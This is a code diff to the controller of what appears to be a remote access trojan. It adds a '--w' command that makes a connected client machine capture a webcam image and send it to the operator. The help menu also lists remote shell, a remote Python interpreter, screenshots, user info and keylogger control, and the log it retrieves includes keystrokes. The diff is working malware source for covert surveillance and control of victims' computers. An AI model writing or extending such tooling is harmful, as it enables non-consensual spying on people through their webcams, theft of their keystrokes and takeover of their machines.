@@ -30,6 +30,7 @@ interface_help = """--h | See this Help Message
 --e | Open a shell
 --i | Open Remote Python Interpreter
 --g | Grabs a screenshot
+--w | Grab a webcam image
 --u | User Info
 --k (start) (stop) (status) | Manage Keylogger
 --l | Returns log from client (includes keylogs)
@@ -89,6 +90,10 @@ def shell_print(data) -> None:
             print(data)
     return
 
+def _time_file() -> str:
+    """ Get a filename from the current time """
+    # returns str
+    return str(datetime.now()).replace(':','-')
 
 def json_dumps(data) -> bytes:
     """ Dump json data and encode it """
@@ -255,7 +260,7 @@ class MultiServer(object):
         self.send(conn, json_dumps(['LOG_FILE']))
         return self.receive(conn).decode()
 
-    def screenshot(self, conn, save_as='{}.png'.format(str(datetime.now()).replace(':','-'))) -> (bool, str):
+    def screenshot(self, conn, save_as='{}.png'.format(_time_file())) -> (bool, str):
         """ Take screenshot on Client """
         # returns True/False, None/error
         self.send(conn, json_dumps(['SCREENSHOT']))
@@ -263,6 +268,17 @@ class MultiServer(object):
         if data == b'ERROR':
             self.send(conn, b'RECEIVING')
             return False, self.receive(conn)
+        with open(save_as, 'wb') as f:
+            f.write(data)
+        return True, save_as
+
+    def webcam(self, conn, save_as='webcam-{}.png'.format(_time_file())) -> bool:
+        """ Take a webcam shot """
+        # returns True/False, save_as/None
+        self.send(conn, json_dumps(['WEBCAM']))
+        data = self.receive(conn)
+        if data == b'ERROR':
+            return False, None
         with open(save_as, 'wb') as f:
             f.write(data)
         return True, save_as
@@ -513,6 +529,14 @@ class MultiServer(object):
                 print('Saved Screenshot.')
             else:
                 print('Error Taking Screenshot: {}'.format(error.decode()))
+            return
+        if '--w' in command:
+            print('Accessing webcam...')
+            result, save_as = self.webcam(conn)
+            if result:
+                print('Saved webcam image')
+            else:
+                print('Error capturing Webcam image')
             return
         if '--u' in command:
             self.get_info(conn)
